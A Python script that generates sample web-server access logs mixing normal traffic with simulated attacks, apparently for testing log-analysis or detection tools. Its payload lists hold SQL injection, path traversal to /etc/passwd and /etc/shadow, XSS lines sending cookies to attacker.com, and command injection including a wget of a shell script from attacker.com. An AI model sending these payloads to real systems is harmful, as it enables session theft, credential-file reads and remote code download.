import os
import random
import argparse
from datetime import datetime, timedelta


NORMAL_IPS = [
    "85.241.12.44", "193.136.5.20", "2.80.17.99",
    "188.37.240.1", "195.23.11.8", "91.152.3.77",
]

NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact",
    "/static/css/main.css", "/static/js/app.js",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/products", "/products/1", "/blog", "/blog/post-1",
]

BRUTE_FORCE_IPS = ["45.33.32.156",   "103.21.244.0",   "198.51.100.5"]
SQLI_IPS        = ["198.20.70.114",  "91.108.4.10",    "185.220.101.1"]
TRAVERSAL_IPS   = ["89.248.165.200", "45.142.212.3",   "194.165.16.11"]
SCANNER_IPS     = ["80.82.77.139",   "162.142.125.0",  "167.94.138.2"]
XSS_IPS = ["45.61.186.22", "198.235.24.130", "89.207.132.170"]
CMD_IPS = ["185.156.73.54", "91.240.118.222", "194.147.78.155"]
HTTP_TAMPERING_IPS = ["193.32.162.44", "45.129.56.200", "91.108.56.181"]

SQLI_PAYLOADS = [
    "/login?user=admin'--",
    "/search?q='+UNION+SELECT+1,2,3--",
    "/api/users?id=1+OR+1=1",
    "/page?id=1;+DROP+TABLE+users--",
    "/product?id=1'+AND+SLEEP(5)--",
]

TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/static/../../../etc/shadow",
    "/download?file=../../../etc/hosts",
    "/.env",
    "/wp-config.php",
    "/.git/config",
]

SCANNER_PATHS = [
    "/wp-admin", "/phpmyadmin", "/.env", "/admin",
    "/manager/html", "/console", "/actuator/health",
    "/api/swagger-ui", "/.htaccess", "/config.php",
    "/backup.zip", "/dump.sql", "/server-status",
]

XSS_PAYLOADS = [
    "/search?q=<script>alert(1)</script>",
    "/comment?text=<img+src=x+onerror=alert(document.cookie)>",
    "/profile?name=<script>document.location='http://attacker.com?c='+document.cookie</script>",
    "/page?id=javascript:alert(1)",
    "/search?q=<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
]

CMD_PAYLOADS = [
    "/ping?host=192.168.1.1;whoami",
    "/backup?file=report.pdf;cat+/etc/passwd",
    "/search?q=test|id",
    "/ping?host=127.0.0.1&&uname+-a",
    "/exec?cmd=$(wget+http://attacker.com/shell.sh)",
]

HTTP_TAMPERING_TARGETS = [
    ("/index.html",    "TRACE"),
    ("/users/1",       "DELETE"),
    ("/users/1",       "PUT"),
    ("/config",        "DELETE"),
    ("/admin",         "TRACE"),
    ("/static/app.js", "PUT"),
    ("/",              "TRACK"),
    ("/login",         "CONNECT"),
    ("/admin",         "DELETE"),
    ("/dashboard",     "PATCH"),
]

METHODS = ["GET", "POST"]
AGENTS  = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.68.0",
    "python-requests/2.28.0",
    "Wget/1.21",
]

AVAILABLE_ATTACKS = ["brute_force", "sqli", "traversal", "scan", "xss", "cmd_injection", "http_tampering"]


def fmt_time(dt: datetime) -> str:
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def make_entry(ip, method, path, status, size, agent, dt) -> str:
    return (
        f'{ip} - - [{fmt_time(dt)}] '
        f'"{method} {path} HTTP/1.1" '
        f'{status} {size} '
        f'"-" "{agent}"'
    )


def _add_brute_force(entries: list, start: datetime):
    base = start + timedelta(hours=3)
    for ip in BRUTE_FORCE_IPS:
        attempts = random.randint(15, 50)
        for i in range(attempts):
            dt = base + timedelta(seconds=i * random.randint(1, 4))
            entries.append((dt, make_entry(
                ip, "POST", "/login", 401,
                random.randint(150, 300), AGENTS[0], dt
            )))
        base += timedelta(hours=1)


def _add_sqli(entries: list, start: datetime):
    base = start + timedelta(hours=7)
    
    shuffled = SQLI_PAYLOADS.copy()
    for ip in SQLI_IPS:
        random.shuffle(shuffled)
        count = random.randint(3, len(shuffled))
        for i, payload in enumerate(shuffled[:count]):
            dt = base + timedelta(seconds=i * random.randint(10, 30))
            entries.append((dt, make_entry(
                ip, "GET", payload, random.choice([200, 500]),
                random.randint(100, 2000), AGENTS[2], dt
            )))
        base += timedelta(hours=1)

def _add_traversal(entries: list, start: datetime):
    base = start + timedelta(hours=11)
    shuffled = TRAVERSAL_PAYLOADS.copy()
    for ip in TRAVERSAL_IPS:
        random.shuffle(shuffled)
        count = random.randint(3, len(shuffled))
        for i, payload in enumerate(shuffled[:count]):
            dt = base + timedelta(seconds=i * random.randint(10, 30))
            entries.append((dt, make_entry(
                ip, "GET", payload, random.choice([200, 403, 404]),
                random.randint(0, 500), AGENTS[3], dt
            )))
        base += timedelta(hours=1)

def _add_scan(entries: list, start: datetime):
    base = start + timedelta(hours=15)
    for ip in SCANNER_IPS:
        paths = random.sample(SCANNER_PATHS * 2, random.randint(20, 25))

        for i, path in enumerate(paths):
            dt = base + timedelta(seconds=i * random.randint(1, 5))
            entries.append((dt, make_entry(
                ip, "GET", path, 404,
                random.randint(0, 200), AGENTS[4], dt
            )))
        base += timedelta(hours=1)

def _add_xss(entries: list, start: datetime):
    base = start + timedelta(hours=19)
    shuffled = XSS_PAYLOADS.copy()
    for ip in XSS_IPS:
        random.shuffle(shuffled)
        count = random.randint(3, len(shuffled))
        for i, payload in enumerate(shuffled[:count]):
            dt = base + timedelta(seconds=i * random.randint(10, 30))
            entries.append((dt, make_entry(
                ip, "GET", payload, random.choice([200, 500]),
                random.randint(100, 2000), AGENTS[2], dt
            )))
        base += timedelta(hours=1)


def _add_command_injection(entries: list, start: datetime):
    base = start + timedelta(hours=20)
    shuffled = CMD_PAYLOADS.copy()
    for ip in CMD_IPS:
        random.shuffle(shuffled)
        count = random.randint(3, len(shuffled))
        for i, payload in enumerate(shuffled[:count]):
            dt = base + timedelta(seconds=i * random.randint(10, 30))
            entries.append((dt, make_entry(
                ip, "GET", payload, random.choice([200, 500]),
                random.randint(100, 2000), AGENTS[2], dt
            )))
        base += timedelta(hours=1)


def _add_http_tampering(entries: list, start: datetime):
    base = start + timedelta(hours=21)
    for ip in HTTP_TAMPERING_IPS:
        targets = random.sample(HTTP_TAMPERING_TARGETS, random.randint(4, len(HTTP_TAMPERING_TARGETS)))
        for i, (path, method) in enumerate(targets):
            dt = base + timedelta(seconds=i * random.randint(5, 20))
            entries.append((dt, make_entry(
                ip, method, path, random.choice([200, 403, 405]),
                random.randint(100, 1000), AGENTS[0], dt
            )))
        base += timedelta(hours=1)


def generate(attacks: list[str] = None):
    if attacks is None:
        attacks = AVAILABLE_ATTACKS

    if sorted(attacks) == sorted(AVAILABLE_ATTACKS):
        base_name = "all_attacks"
    else:
        base_name = "_".join(attacks)

    output_path = f"logs/{base_name}.log"
    counter = 2
    while os.path.exists(output_path):
        output_path = f"logs/{base_name}_{counter}.log"
        counter += 1

    entries = []
    start = datetime(2025, 6, 1, 0, 0, 0)

    for i in range(300):
        dt     = start + timedelta(seconds=random.randint(0, 86400))
        ip     = random.choice(NORMAL_IPS)
        path_  = random.choice(NORMAL_PATHS)
        method = random.choices(METHODS, weights=[70, 30])[0]
        status = random.choices([200, 304, 404], weights=[80, 15, 5])[0]
        size   = random.randint(200, 15000)
        agent  = random.choice(AGENTS)
        entries.append((dt, make_entry(ip, method, path_, status, size, agent, dt)))

    attack_map = {
        "brute_force":    _add_brute_force,
        "sqli":           _add_sqli,
        "traversal":      _add_traversal,
        "scan":           _add_scan,
        "xss":            _add_xss,
        "cmd_injection":  _add_command_injection,
        "http_tampering": _add_http_tampering,
    }

    for attack in attacks:
        if attack in attack_map:
            attack_map[attack](entries, start)

    entries.sort(key=lambda x: x[0])
    with open(output_path, "w") as f:
        for _, line in entries:
            f.write(line + "\n")

    print(f"[+] Generated {len(entries)} log entries -> {output_path}")
    print(f"    Attacks included: {', '.join(attacks)}")


def _parse_args():
    parser = argparse.ArgumentParser(
        description="Generate sample Apache/Nginx log files for testing."
    )
    parser.add_argument(
        "--attacks",
        nargs="+",
        choices=AVAILABLE_ATTACKS,
        default=AVAILABLE_ATTACKS,
        help="Attack types to include. Choices: brute_force sqli traversal scan"
    )
    return parser.parse_args()


if __name__ == "__main__":
    args = _parse_args()
    generate(attacks=args.attacks)